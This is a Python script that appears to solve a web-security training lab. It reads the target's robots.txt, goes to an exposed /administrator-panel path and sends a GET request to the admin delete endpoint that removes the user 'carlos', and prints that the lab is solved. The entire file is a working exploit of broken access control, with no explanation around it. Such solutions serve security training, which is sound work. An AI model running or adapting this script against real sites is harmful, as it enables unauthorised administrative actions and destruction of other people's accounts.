import requests
from colorama import Fore
import sys
import time

def display_error(message):
    print(Fore.RED + message)
    sys.exit(1)

def fetch_robots_txt(url):
    try:
        response = requests.get(url)
        response.raise_for_status()
        return response.text
    except requests.RequestException as e:
        display_error(f"Error retrieving robots.txt: {str(e)}")

def main():
    if len(sys.argv) != 2:
        display_error("Usage: python3 main.py <Lab_URL>")

    lab_url = sys.argv[1]
    robots_txt_url = f"{lab_url}/robots.txt"

    print(Fore.YELLOW + "Fetching robots.txt...")
    robots_txt_content = fetch_robots_txt(robots_txt_url)
    time.sleep(2)

    print(Fore.CYAN + "Allowed List in our robots.txt:")
    print(robots_txt_content)
    time.sleep(2)

    print(Fore.CYAN + "Accessing the admin panel through /administrator-panel")
    admin_url = f"{lab_url}/administrator-panel"
    time.sleep(2)

    print(Fore.CYAN + "Deleting the user called carlos")
    delete_params = {"username": "carlos"}
    delete_carlos_url = f"{admin_url}/delete"
    r = requests.get(delete_carlos_url, params=delete_params)
    
    print(Fore.CYAN + "Carlos user got deleted, and you have solved the lab !!!")

if __name__ == '__main__':
    main()
